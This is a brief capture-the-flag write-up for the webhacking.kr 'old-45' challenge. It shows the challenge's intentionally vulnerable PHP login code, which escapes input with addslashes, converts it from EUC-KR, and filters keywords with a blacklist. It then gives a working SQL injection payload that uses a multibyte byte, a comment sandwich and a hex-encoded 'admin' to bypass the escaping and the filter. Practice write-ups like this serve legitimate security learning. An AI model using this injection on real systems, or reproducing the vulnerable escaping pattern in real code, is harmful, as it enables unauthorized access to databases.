# Old 45    SQLi (Unicode)

URL: [https://webhacking.kr/challenge/web-22/](https://webhacking.kr/challenge/web-22/)
Source: [https://webhacking.kr/challenge/web-22/?view_source=1](https://webhacking.kr/challenge/web-22/?view_source=1)

```php
<?php
if ($_GET["id"] && $_GET["pw"]) {
    $db = dbconnect();
    $_GET["id"] = addslashes($_GET["id"]);
    $_GET["pw"] = addslashes($_GET["pw"]);
    $_GET["id"] = mb_convert_encoding($_GET["id"], "utf-8", "euc-kr");
    if (preg_match("/admin|select|limit|pw|=|<|>/i", $_GET["id"])) {
        exit();
    }
    if (preg_match("/admin|select|limit|pw|=|<|>/i", $_GET["pw"])) {
        exit();
    }
    $result = mysqli_fetch_array(
        mysqli_query(
            $db,
            "select id from chall45 where id='{$_GET["id"]}' and pw=md5('{$_GET["pw"]}')"
        )
    );
    if ($result) {
        echo "hi {$result["id"]}";
        if ($result["id"] == "admin") {
            solve(45);
        }
    } else {
        echo "Wrong";
    }
}
?>
```

Look into [[old-50 -- SQLi (Unicode)]] for more details, TLDR it's unicode + sandwich attack.

Payload:
```sql
id: %A1'/*                                         #'
pw: */ OR id LIKE 0x61646d696e #                   # Verbose
pw: */%20OR%20id%20LIKE%200x61646d696e%20%23       # URLEncoded
```

![old-45.png](/assets/ctf/webhacking.kr/old-45.png)

